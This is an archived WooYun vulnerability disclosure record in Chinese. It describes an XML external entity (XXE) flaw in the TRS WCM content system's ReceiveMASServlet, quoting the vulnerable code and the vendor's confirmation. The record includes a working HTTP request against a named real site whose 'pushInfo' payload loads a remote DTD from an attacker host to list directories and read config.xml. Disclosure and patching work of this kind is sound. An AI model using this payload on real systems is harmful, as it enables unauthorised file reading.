{"id": 73346, "wybug_id": "wooyun-2015-0145924", "wybug_title": "TRSWCM 文件读取漏洞通杀较新版本（二）", "wybug_corp": "北京拓尔思信息技术股份有限公司", "wybug_author": "applychen", "wybug_date": "2015-10-11 09:06", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 貌似是后续更新的时候添加的一个功能，通杀较新版本。 详细说明：  其实还是XML实体注入，不过这次是用的DOM解析XML。web.xml中配置的Servlet ReceiveMASServlet：\n<servlet>    <servlet-name>ReceiveMASServlet</servlet-name>    <servlet-class>com.trs.components.video.ReceiveMASServlet</servlet-class>  </servlet>  <servlet-mapping>    <servlet-name>ReceiveMASServlet</servlet-name>    <url-pattern>/app/video/ReceiveMASServlet</url-pattern>  </servlet-mapping>\n对应的com/trscomponents/video/ReceiveMASServlet.java代码如下：\nprotected void service(HttpServletRequest request, HttpServletResponse response)\t\tthrows ServletException, IOException\t{\t\tString event = request.getParameter(\"event\");\t\tString string = request.getParameter(\"pushInfo\");\t\tLOG.info(\"push event: \" + event);\t\tLOG.info(\"push pushInfo: \" + string);\t\tif (string != null)\t\t{\t\t\tElement root = SimpleConsoleLogger.parserXml(string);//解析XML入口\t\t\tif (root.element(\"time\") != null || \"time\".equals(root.element(\"time\")))\t\t\t{\n获取pushInfo参数的数值，然后SimpleConsoleLogger.parserXml()解析XML，方法如下：\npublic static Element parserXml(String fileName)  {    Element root = null;    try {      System.out.println(\"filename:\" + fileName);      Document document = DocumentHelper.parseText(fileName);//DOM解析XML      root = document.getRootElement();    }    catch (DocumentException e)    {      e.printStackTrace();    }    return root;  }\n以上调用DocumentHelper.parseText()解析XML。同样的还是burpsuite直接发送以下包：\nPOST /wcm/app/video/ReceiveMASServlet HTTP/1.1Host: cms.ce.cnUser-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=70C0A254A8662618477A7C2C709C614AConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 101pushInfo=<!DOCTYPE+root+[<!ENTITY+%25+remote+SYSTEM+\"http%3a//ip/1.xml\">%25remote%3b]>\n由于trswcm默认jdk是<1.7的所以在1.xml中用gopher协议控制读取文件列目录等操作，以cms.ce.cn为例进行测试，列目录：\n\n读取文件config.xml：\n\n   漏洞证明：  同上   修复方案：  过滤pushInfo参数传递的数据中的<!DOCTYPE关键字或者在底层禁止引用实体   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-10-12 13:37 厂商回复： 感谢您的反馈，经确认问题存在。在非可控的xml输入源的情况下，解析xml时存在安全隐患，目前已完成修复方案的制定和补丁包的提供，将尽快为用户进行修复。*** 安全无止境，我们一直在努力！*** 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-11 09:39 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:28        | 开发真是日了狗了)\t\t \n  前排膜拜大牛    \n     2015-10-11 11:58 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1656 漏洞数:246        | WooYun is the Bigest gay place.  网络工...)\t\t \n  666666，坐等公开。    \n     2015-10-16 11:23 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  xxe漏洞？    \n     2015-12-16 13:49 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1656 漏洞数:246        | WooYun is the Bigest gay place.  网络工...)\t\t \n  当我支付了测试代码，我估计楼主欺骗了我幼小的心灵...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}